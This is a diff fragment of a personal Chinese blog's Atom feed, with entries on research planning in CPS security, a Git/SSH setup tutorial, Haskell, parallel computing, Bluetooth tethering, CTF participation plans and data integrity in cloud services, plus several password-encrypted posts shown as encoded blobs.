+                "var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;" +
+                "VARIANT['normal'].fonts.unshift('MathJax_default');" +
+                "VARIANT['bold'].fonts.unshift('MathJax_default-bold');" +
+                "VARIANT['italic'].fonts.unshift('MathJax_default-italic');" +
+                "VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');" +
+            "});" +
+        "}";
+    (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript);
+}
+&lt;/script&gt;</content><category term="cps"></category><category term="security"></category></entry><entry><title>新学期计划</title><link href="http://shangfute.github.com/first-term-plan.html" rel="alternate"></link><published>2017-02-17T08:52:07+08:00</published><updated>2017-02-17T08:52:07+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2017-02-17:/first-term-plan.html</id><summary type="html">&lt;ol&gt;
+&lt;li&gt;找研究方向&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;读大量文章，回答下面问题：&lt;/p&gt;
+&lt;p&gt;目前都有哪些研究团体在做CPS安全？&lt;/p&gt;
+&lt;p&gt;他们都在做什么问题，哪些更有意义？尽可能多读，不只论文。&lt;/p&gt;
+&lt;p&gt;哪些问题是刚出现的，没有很好的解决方案？或者解决方案较少的问题？&lt;/p&gt;
+&lt;p&gt;还有没有什么我可以做的，如何从新的角度探索这个问题？&lt;/p&gt;
+&lt;p&gt;利用自己的优势：编程？理论？算法？机器学习？&lt;/p&gt;
+&lt;p&gt;每次看论文时，考虑如果我来做这个问题，我会怎么做？&lt;/p&gt;</summary><content type="html">&lt;ol&gt;
+&lt;li&gt;找研究方向&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;读大量文章，回答下面问题：&lt;/p&gt;
+&lt;p&gt;目前都有哪些研究团体在做CPS安全？&lt;/p&gt;
+&lt;p&gt;他们都在做什么问题，哪些更有意义？尽可能多读，不只论文。&lt;/p&gt;
+&lt;p&gt;哪些问题是刚出现的，没有很好的解决方案？或者解决方案较少的问题？&lt;/p&gt;
+&lt;p&gt;还有没有什么我可以做的，如何从新的角度探索这个问题？&lt;/p&gt;
+&lt;p&gt;利用自己的优势：编程？理论？算法？机器学习？&lt;/p&gt;
+&lt;p&gt;每次看论文时，考虑如果我来做这个问题，我会怎么做？&lt;/p&gt;</content><category term="plan"></category></entry><entry><title>Git deploy</title><link href="http://shangfute.github.com/git-ssh-deploy.html" rel="alternate"></link><published>2016-06-26T23:33:07+08:00</published><updated>2016-06-26T23:33:07+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2016-06-26:/git-ssh-deploy.html</id><summary type="html">&lt;p&gt;Git是分布式的代码管理工具，远程的代码管理是基于SSH的，所以要使用远程的Git则需要SSH的配置。 github的SSH配置如下： &lt;/p&gt;
+&lt;h2&gt;一 、 设置Git的user name和email：&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;git&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;global&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;shangfute&amp;quot;&lt;/span&gt; 
+&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;git&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;global&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;email&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;shangfute@163.com&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;二、生成SSH密钥过程：&lt;/h2&gt;
+&lt;p&gt;1.查看是否已经有了ssh密钥：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cd ~/.ssh
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;如果没有密钥则不会有此文件夹，有则备份删除 &lt;/p&gt;
+&lt;p&gt;2.生成密钥： &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;keygen&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="n"&gt;rsa&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt; &lt;span class="err"&gt;“&lt;/span&gt;&lt;span class="n"&gt;shangfute&lt;/span&gt;&lt;span class="mf"&gt;@163.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="err"&gt;”&lt;/span&gt;
+
+&lt;span class="n"&gt;Your&lt;/span&gt; &lt;span class="n"&gt;identification&lt;/span&gt; &lt;span class="n"&gt;has&lt;/span&gt; &lt;span class="n"&gt;been&lt;/span&gt; &lt;span class="n"&gt;saved&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;shangfute&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;id_rsa&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="n"&gt;Your …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;Git是分布式的代码管理工具，远程的代码管理是基于SSH的，所以要使用远程的Git则需要SSH的配置。 github的SSH配置如下： &lt;/p&gt;
+&lt;h2&gt;一 、 设置Git的user name和email：&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;git&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;global&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;shangfute&amp;quot;&lt;/span&gt; 
+&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;git&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;global&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;email&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;shangfute@163.com&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;二、生成SSH密钥过程：&lt;/h2&gt;
+&lt;p&gt;1.查看是否已经有了ssh密钥：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cd ~/.ssh
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;如果没有密钥则不会有此文件夹，有则备份删除 &lt;/p&gt;
+&lt;p&gt;2.生成密钥： &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;keygen&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="n"&gt;rsa&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt; &lt;span class="err"&gt;“&lt;/span&gt;&lt;span class="n"&gt;shangfute&lt;/span&gt;&lt;span class="mf"&gt;@163.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="err"&gt;”&lt;/span&gt;
+
+&lt;span class="n"&gt;Your&lt;/span&gt; &lt;span class="n"&gt;identification&lt;/span&gt; &lt;span class="n"&gt;has&lt;/span&gt; &lt;span class="n"&gt;been&lt;/span&gt; &lt;span class="n"&gt;saved&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;shangfute&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;id_rsa&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="n"&gt;Your&lt;/span&gt; &lt;span class="n"&gt;public&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="n"&gt;has&lt;/span&gt; &lt;span class="n"&gt;been&lt;/span&gt; &lt;span class="n"&gt;saved&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;shangfute&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;id_rsa&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pub&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="n"&gt;The&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="n"&gt;fingerprint&lt;/span&gt; &lt;span class="nl"&gt;is&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="err"&gt;………………&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;最后得到了两个文件：&lt;code&gt;id_rsa&lt;/code&gt;和&lt;code&gt;id_rsa.pub&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;4.在&lt;code&gt;github&lt;/code&gt;上添加&lt;code&gt;ssh&lt;/code&gt;密钥，这要添加的是“id_rsa.pub”里面的公钥。 打开&lt;code&gt;https://github.com/&lt;/code&gt; ，登陆&lt;code&gt;shangfute&lt;/code&gt;，然后添加&lt;code&gt;ssh&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;5.测试：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ssh git@github.com 
+The authenticity of host ‘github.com (207.97.227.239)’ can’t be established. RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added ‘github.com,207.97.227.239′ (RSA) to the list of known hosts. ERROR: Hi shangfute! You’ve successfully authenticated, but GitHub does not provide shell access Connection to github.com closed.
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;三、 开始使用github&lt;/h2&gt;
+&lt;p&gt;1.获取源码： &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ git clone git@github.com:shangfute/github-services.git
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;2.这样你的机器上就有一个repo了。 &lt;/p&gt;
+&lt;p&gt;3.git于svn所不同的是git是分布式的，没有服务器概念。所有的人的机器上都有一个repo，每次提交都是给自己机器的repo &lt;/p&gt;
+&lt;p&gt;仓库初始化： &lt;code&gt;git init&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;生成快照并存入项目索引： &lt;code&gt;git add&lt;/code&gt; 文件,还有&lt;code&gt;git rm&lt;/code&gt;,&lt;code&gt;git mv&lt;/code&gt;等等… &lt;/p&gt;
+&lt;p&gt;项目索引提交： &lt;code&gt;git commit&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;4.协作编程： &lt;/p&gt;
+&lt;p&gt;将本地repo于远程的origin的repo合并， 推送本地更新到远程： &lt;code&gt;git push origin master&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;更新远程更新到本地： &lt;code&gt;git pull origin master&lt;/code&gt;&lt;/p&gt;</content><category term="web"></category><category term="learn"></category></entry><entry><title>Learn Haskell</title><link href="http://shangfute.github.com/haskell.html" rel="alternate"></link><published>2016-05-26T23:33:07+08:00</published><updated>2016-05-26T23:33:07+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2016-05-26:/haskell.html</id><summary type="html">&lt;p&gt;I found an interesting tuturial of Haskell programming language today, and had fun with the magic features of functional programming, lazy evaluation, type system and pattern matching. They are very different from the instructive programming language and very expressive. I want to learn more about how to translate them into …&lt;/p&gt;</summary><content type="html">&lt;p&gt;I found an interesting tuturial of Haskell programming language today, and had fun with the magic features of functional programming, lazy evaluation, type system and pattern matching. They are very different from the instructive programming language and very expressive. I want to learn more about how to translate them into lambda calculation. I knew some techniques frome the SICP, but more details about realization need to practice. Maybe I would try to make some contribution to the community.&lt;/p&gt;</content><category term="functioanl programming"></category><category term="haskell"></category></entry><entry><title>并行架构</title><link href="http://shangfute.github.com/parallel-architechture.html" rel="alternate"></link><published>2016-05-24T22:57:17+08:00</published><updated>2016-05-24T22:57:17+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2016-05-24:/parallel-architechture.html</id><summary type="html">&lt;p&gt;并行架构分为位级并行、指令级并行、数据级并行以及任务级并行。&lt;/p&gt;
 &lt;p&gt;我比较关注任务级并行，也就是我们平时常说的多处理器架构。对于多处理器架构还分为两种模型：共享内存模型和分布式内存模型。&lt;/p&gt;
 &lt;p&gt;共享内存模型的多处理器架构依靠共享的内存进行通信，其效率一般比较高。而分布式内存模型中每个处理器都有一个本地内存，依靠网络进行通信，效率较低，但是更容易并行化。&lt;/p&gt;</summary><content type="html">&lt;p&gt;并行架构分为位级并行、指令级并行、数据级并行以及任务级并行。&lt;/p&gt;
 &lt;p&gt;我比较关注任务级并行，也就是我们平时常说的多处理器架构。对于多处理器架构还分为两种模型：共享内存模型和分布式内存模型。&lt;/p&gt;
@@ -197,7 +474,7 @@ geographically distributed cloud&lt;/p&gt;
 &lt;p&gt;并发指能够同时应对多个任务。并行指同时做多个任务的能力。区别在于一个是“应对”，一个是“做”。“应对”针对问题定义层面，“做”针对解决方法层面。比如，我们可以边看电视边烧饭，同时面临两个任务，是并发。同样可以再请别人帮忙一起做饭，同时解决问题，是并行。&lt;/p&gt;
 &lt;p&gt;因此，并发不一定并行解决，并行同样不一定针对并发问题。并发任务在解决时可以按顺序逐一解决，当然也可以同时解决。并行也可以解决非并发的问题，提高计算效率。不过并行能够起作用一定是针对的问题可以转化为并发问题。&lt;/p&gt;</summary><content type="html">&lt;p&gt;目前，计算机几乎无法离开并行计算的能力，同时编程中还有一个并发的概念。并发与并行看起来都是同时做某事，但实际上存在区别。&lt;/p&gt;
 &lt;p&gt;并发指能够同时应对多个任务。并行指同时做多个任务的能力。区别在于一个是“应对”，一个是“做”。“应对”针对问题定义层面，“做”针对解决方法层面。比如，我们可以边看电视边烧饭，同时面临两个任务，是并发。同样可以再请别人帮忙一起做饭，同时解决问题，是并行。&lt;/p&gt;
-&lt;p&gt;因此，并发不一定并行解决，并行同样不一定针对并发问题。并发任务在解决时可以按顺序逐一解决，当然也可以同时解决。并行也可以解决非并发的问题，提高计算效率。不过并行能够起作用一定是针对的问题可以转化为并发问题。&lt;/p&gt;</content><category term="parallization"></category><category term="cocurrency"></category></entry><entry><title>[Encrypted] Tangled Thoughts</title><link href="http://shangfute.github.com/tangled-thoughts.html" rel="alternate"></link><published>2016-05-22T22:20:39+08:00</published><updated>2016-05-22T22:20:39+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2016-05-22:/tangled-thoughts.html</id><summary type="html"></summary><content type="html">&lt;div id="pec-encrypted-content" style="display:none"&gt;MZnD8IPUkqMD6Qr/unhmIQ==;INr7xbDPcpXxNpicLgrbYBqJ015+hVxZVNsdH8XsLWy5ynWUmYUahD8DBditL0+dVi4Ax8ldD5RrAuIkMokYpQyR5TIyLvN2K56VVtp7XhnjZkMmK/fpgfA89FcVhGbVLMYKwZhLAAH8+1dAhsuMLSDlHG4E/mjzPUWpOXHdnDwn7WaHiaDQuW2i3OMYDmZV8pscoqCYFkcHQ/Sv3ZPTMCj7T5hXnXoUQ53JSNzgNLLO7PXqBWS3MVj5OBW0fact56Vuq4QozJz4jJi4sOtUox7I3bUQddXt3MhGV5KMjzvIRcTsHI3RIzDm5F5bjRROdYfPGZr1NhW9uDUpSlWPkND2Cu/ealCldbYm6CFqsqZbJuzZ8AJl4XZOaEgz7plG0vXlFAJUeMqV4+Pg1h+F50G4Mn6+4T99LsOynkXZyGkbLChue9dvvHTmYqKLZHlvOw/C28jPY+vUeI+X0WaxDQzd59d7A8Frn96IF0h+xyG+5PtpnrOJL2KFAOQdKJufdzNyppKhwRZgD+3Zk1ejrfvEo7qLLcLKKTnegqIbz5lVWRQIYnRNFvuERDUO2hoGqFBOKLrBXZIaCSXIruvHbn8jUILIV6S5FG+fVDAbMalAwYr4Lb5EydXBn1BB55kK+pzgqa3122cEJICT6q7Xl3OlaLaJ6PrtEpuw0Z4o+KkvZSmIROkTKBT8I7H0fV4Gfd5E20U0/wLDRBGt9uz03EsAQP8e5P6LUvo+ug04w8bEeURZNcKDP5tQgo61WrNq+nUYDLqijQC2FD7eVHJ2gd8YYJ2qKvVQWppQs5aKlcWzx/HaYDKiStEpU3L8su0dY/axl/ems+qLL8+8ai201zpZN6RtUPaI7CZICMFq1IRQyuFUx6E1yzgFP/94jFCzVStIwgg3A98Ci1j0QSBQNPzkUlNcDIxb+aRjq/YBOFn0zr3NYJIIpk9eoFDAOHzyK1Br5lozrro1+vcfu5kml4NDX3KDN8lAXqF6ov61lDY0Ws4U8UgpY8Rta26A9YGyhCzWukRKqBeDhk9bYBC30IiV2Af6am5SPWnDWikuolpGiECFfZcVlOJ7bFG732MwmyI+MqJCEBQJQ/kxsXChuBLliY960GC0UdSo7NwQdF1HbKvHTVRnvwNAnSwpTzQ712KfGgAvoE4cVNgZ++apNB8B2cHShHXUEFkdinngPMK4vqZ5Qs46Cr75sBSfGwUpByNuFUWM5JNZ8Lp58OYoJyC1uv453jUypBS3bndpN0cPQU5xOSMrRXcezpVRKDUt3hc5veiB2x4Dfk9Cpfa80OIJM0vsr52dpiDD7QJkJ/zf7Zd7L3+gjAa4IK4pOloZr3COSeVAC/ETJHWDBxjU9YXW7EqbFzpig9GNBVKshob10+vPDZwBcqsIR8PwOvC47P3onqY6IoTVqaMtriyfH6SVfKOCEZQa1tfT46EFdvk=;^&lt;/div&gt;
+&lt;p&gt;因此，并发不一定并行解决，并行同样不一定针对并发问题。并发任务在解决时可以按顺序逐一解决，当然也可以同时解决。并行也可以解决非并发的问题，提高计算效率。不过并行能够起作用一定是针对的问题可以转化为并发问题。&lt;/p&gt;</content><category term="parallization"></category><category term="cocurrency"></category></entry><entry><title>[Encrypted] Tangled Thoughts</title><link href="http://shangfute.github.com/tangled-thoughts.html" rel="alternate"></link><published>2016-05-22T22:20:39+08:00</published><updated>2016-05-22T22:20:39+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2016-05-22:/tangled-thoughts.html</id><summary type="html"></summary><content type="html">&lt;div id="pec-encrypted-content" style="display:none"&gt;hJNKyx28rVr4l4jKV9tvUA==;cI+FF/ziS/P7ZpL0TgSHC3M7XvG3hrDlkqToIj3A//fGzYnVKuG/qQsUHBmo0EF4Mw5+VTr2HugWegsDhiZxGvzk66RIm1e7pfloJGbZWMXYXG/qzgLSH6rEKCb8I823haIydqkk94jC7Sg210zOOen7D2XQkoNbxP1QbHgFzqA5iXeCE1UvBmAnnvyJuMW/LzSYe1VYLJdiXArYd9YdKAMkRiTN7JYUDjRo3n7l/6aYdfL7xtOSJtx5RVL6xoQwpBEfH2OGLA5BTXfu4qrdPDRe7k+jCQz88OxFVVPSHbX7oLxsLxan+OIm+Pd33jRKRqOH6aZogGF4dODX9mf7QA7WTCNAF/9LVWDevN/OZmq0JgHCRY/LOGbqxT/RXlGBOAuqaQmTHsfN+UHX4oJnDA0JfBFXZb8xcvBL4JU15pa9e81F06mkAMI9VfnJwyWbyWmPaN030MMHqqD3bpqJVheErUAQ2+9qtqpyUh5dwWK8EChdKsTFBA0sqBuUspfe0kjQCjxm0M8vrpUNPixo3ySTq8nhq0VyoqnUHClo0d7tqCxRN9JBt4t4FeNtrHHvrC0uUXAFcgGYJCE7309d7a4SpBLiExguUUtladg6N+ZT8YI7BMYzQ8Nng8Agwhw9FnM7e8Xy9ldR1YMhhTuOnPQe1Bs18mRjZDb3uSCMyFHig0NDdtNO12VpG3NYh705cO6b0TgdTYo9Csjh0wVvoTr7pnLqX58e8022eZBsFiLRXGH3L1Fi2ACwFdZK0xckjkvXnndkwB1fts2qUSoAIpOrjBsDQIY9+FxJuo/JZwcKPQu7XH6GC5hhfnVLLrmWOPOuyTYNc1xKMNY54o9akOgch3orO5M1InpeuMDsU/Iz7EpiKhxYE8+KcYO3eVKFLJLssTHOXQ7nXrZl83WJprlagz/l0sGhkArRT1Apr1XcSwjGtsvlUQ++5wGLKDTxJiaNZndU8zFOBerS7Thsey8rHwyFQZQ5hcCXBxZmMpBePW7I/3jp634XDFqHA9ZxK4iA3cSjhCuqEfYvVCTcCeoU+Q4kyVdgl6uOTnZAlEJMhLbX8kwzjXKKTXNOQwiTa9NzE8T7G4XnpZmgpWMF8GLn6kxlDIJdyehFctHrmwAgQsXxHndpINTygwTAkBZoUhUOl73kI5ZMis9Vtr4eKMqdJkP1NMdsrhzTIXAyFQ/0c50vcctlEVLGEEmR85jxY5lc3DLX0XFiU1sVEZOQdDr7Ihb9PFjknmTgGdWeouSFb8U+dY7e+dqVvmEX2TEUjHIH90FOWGs4bbVdchcvPA2UB992MYl2QYn2hBYqyAzw9PPHD/T2hFrbaa1RbvFIobVrcQRHv2368TIEOcyglSE/LNP5P+T+82ztHFbMwRoJI0RxNE1hzwWVn9wXW17DXXp/la+EQxx/vVBU0aimzofn29QHNZiZvEXJFo/qE0o=;^&lt;/div&gt;
 &lt;div id="pec-decrypted-content"&gt;
     &lt;h4&gt;&lt;i&gt;&lt;/i&gt;&lt;/h4&gt;
 &lt;/div&gt;
@@ -303,7 +580,7 @@ geographically distributed cloud&lt;/p&gt;
 &lt;p&gt;设置很简单，手机和电脑配对后，手机上建立蓝牙共享网络，电脑上加入蓝牙网络即可。&lt;/p&gt;
 &lt;p&gt;这样不需要建热点也能上网了。&lt;/p&gt;</summary><content type="html">&lt;p&gt;我们一般通过手机让电脑上网的方式都是通过在手机上建立Wi-Fi热点的方式进行，今天学习了另一种方式，通过蓝牙建立共享网络。&lt;/p&gt;
 &lt;p&gt;设置很简单，手机和电脑配对后，手机上建立蓝牙共享网络，电脑上加入蓝牙网络即可。&lt;/p&gt;
-&lt;p&gt;这样不需要建热点也能上网了。&lt;/p&gt;</content><category term="skill"></category><category term="bluetooth"></category></entry><entry><title>CTF and code</title><link href="http://shangfute.github.com/best-coder-ctf.html" rel="alternate"></link><published>2016-05-19T11:01:49+08:00</published><updated>2016-05-19T11:01:49+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2016-05-19:/best-coder-ctf.html</id><summary type="html">&lt;p&gt;之前耀哥问我要不要参加百度之星编程竞赛，其实有一点要参加的想法。但是一方面感觉自己水平太差，那不了什么名次；另一方面还想着时间不够，我其实更想参加CTF。&lt;/p&gt;
+&lt;p&gt;这样不需要建热点也能上网了。&lt;/p&gt;</content><category term="skill"></category><category term="bluetooth"></category></entry><entry><title></title><link href="http://shangfute.github.com/best-coder-ctf.html" rel="alternate"></link><published>2016-05-19T11:01:49+08:00</published><updated>2016-05-19T11:01:49+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2016-05-19:/best-coder-ctf.html</id><summary type="html">&lt;p&gt;之前耀哥问我要不要参加百度之星编程竞赛，其实有一点要参加的想法。但是一方面感觉自己水平太差，那不了什么名次；另一方面还想着时间不够，我其实更想参加CTF。&lt;/p&gt;
 &lt;p&gt;其实现在各种竞赛这么多，还有Kaggle、天池什么的都很诱人。但是毕竟人的精力是有限的。我现在希望能够首先集中精力到CTF中。&lt;/p&gt;
 &lt;p&gt;想到这里，发现其实我同样没有参加多少CTF，那么何谈精力有限呢。那么我很少参加编程竞赛和很少参加CTF的原因是否其实一样呢。&lt;/p&gt;
 &lt;p&gt;那么做个实验吧，下周我要尝试参加所有能够参加的CTF。如果做到了，那么坚持参加CTF。如果没有做到说明，我不能参加竞赛另有原因。我应当尝试找出更深入的原因。&lt;/p&gt;
@@ -369,7 +646,105 @@ geographically distributed cloud&lt;/p&gt;
 &lt;p&gt;相信本文读者都在使用各种各样的网络应用，这些网络应用大多存在于云服务器上，客户端通常就是一个浏览器。大公司还可以构建自己的云，但许多小型组织和个人还是在租用公有云，因此数据存储在别人的计算机上。比如，大家使用淘宝时，交易记录都是存储在淘宝服务器上的，你可以查找之前在淘宝上买过的所以东西。这样做有很多好处，但同样难以保证这些数据的完整性，不被恶意修改。另一方面，难以保证这些数据不被用作它途，被恶意数据挖掘等等。&lt;/p&gt;
 &lt;p&gt;比如文章评论功能可以自己实现，也可以将该项工作外包给别人。本站点的评论功能使用了多说的社会化评论服务，评论的数据以明文的形式存储在多说的服务器上。每次访问网站时，浏览器向多说的服务器发送请求，获得评论。因此难以确保这些外包的数据有没有被修改。这时候评论数据不需要保密，但是应当保证不被修改。&lt;/p&gt;
 &lt;p&gt;一项工作有多少实际价值，就看它能帮助什么人，解决什么问题。帮助的人越多，解决的问题越普遍，越重要，价值越大。这个问题可以推广为如何保证外包数据的完整性。做为一个密码学狗，马上想到构造恰当的密码学协议来解决这个问题。当然可能还有其他解决方法，不要将自己局限与特定领域，应当使用所有可能知识来解决。比如，我可以和多说签订合同，如果对方违约没有保护好数据，就应当赔我多少钱。但对我来说，这种方法显然有些困难。最后我会选取能够想到的最简单的方法来解决这个问题。&lt;/p&gt;
-&lt;p&gt;密码学从根本上讲，或许就是一种通过数学方法来解决信任问题的学问。密码学想要将对某个人或组织的信任，等价为对某种数学问题的难解性的信任。如果你相信数学，那么你也应当相信大家可以共同完成某个任务。&lt;/p&gt;</content><category term="web"></category><category term="crypto"></category><category term="cloud"></category></entry><entry><title>[Encrypted] Think Flow</title><link href="http://shangfute.github.com/think-flow.html" rel="alternate"></link><published>2016-05-12T15:37:57+08:00</published><updated>2016-05-12T15:37:57+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2016-05-12:/think-flow.html</id><summary type="html"></summary><content type="html">&lt;div id="pec-encrypted-content" style="display:none"&gt;pBX1beYJipgKC6wfwn340w==;bF0i63TPS94/MB6rwxn7RpCJq2kx73Guq9DiwLiq+ZEekIyGPISCi+IRq71Z4qDLhIYG+I62z21G/TUTm3AZCRG85HrdaCHDB8aNqoTu3JNd1C2R5IXV16yNtGyQ/KUFTiWclaUqS9mvXYhfHHMLBSqkr0aomPv+pVSfeTguPAHmFSBp9cVIrAFZT5EfhB3XyOMZZnIKIHvReEY4ixB2TDtOEfsdpdFkn0v2kGPBXIIJSREqo3Aczvc6khm9bWa0STQhnseZfreI6NCFK1U8r/hB5F31dD/KncCCIleQt4muqo7Glf0WCJskYx9olmqAB3w3V7xXOBK/Vf8KgVeGGaxEQKubXOPW8RW2ssV5NzqOQjv6SDcaa01Rp39Dlcpbwzmn6IQDIruQ20QjJE+SMqZ1wff923npXJ8STaIm/XfwGRP6m/npNecxQsAG29FMYOd20/DM914DRdJIAzo99wB+5ZdSBCIGLt/hmk1Tl6VEfCllKaRsg98xKjmj/KrsmL2fkeFlaEPYietnPW11YsNRVGB97RtPjDWwAOMzn9Z6WwF0al+hXh5MZrqPVnNDBrRm0WzW8DZoG4pTWaDo2CuouZ5YetHh1FjN5URCwYS+j8ra4w5JxQ4VwLH8feuDC0FBw1P/pfi78egj2dtQICvT1C360W5AjOuMkk5dwij/igpuoyWCY0RPIi2eL/VcKl+7OJZ8jQJoPejGevLSM4nBUuNOj1yc7uukOWODgqnHsgtlNLBmn+qtCzKU7Y0ksNIYH51Js4bPIrnkm8CBkMrDgHyJbFVRoF6ISEMvatNVFl0qyvQUx27toLKCGH5Eydnbrs+b8HAeSr8bP1cNHmpo3YnfJABuXbvXaxBq2pShzqLtveteqP8JQjLO0apwO80BfU5qdOzowUF2+6uBxlH8mmQ4W2iPgSQcATf4+E2bRZRVXKMkY6hWgrs2jGNBnEFVf86ra7P6ImrVPU0MmH7hbzxCu485G276L2f6zgXqPSAm0GaxZzoz/Gq+qJ+VtchBjNSPbR0efan67gA+cvNY8WH9XJq/U+HjO+rzMhn+vFK/DEYZUP2/hw62voiFXIYyePfVmJ2JBEG6bYPgpuzbCa32tZpbBV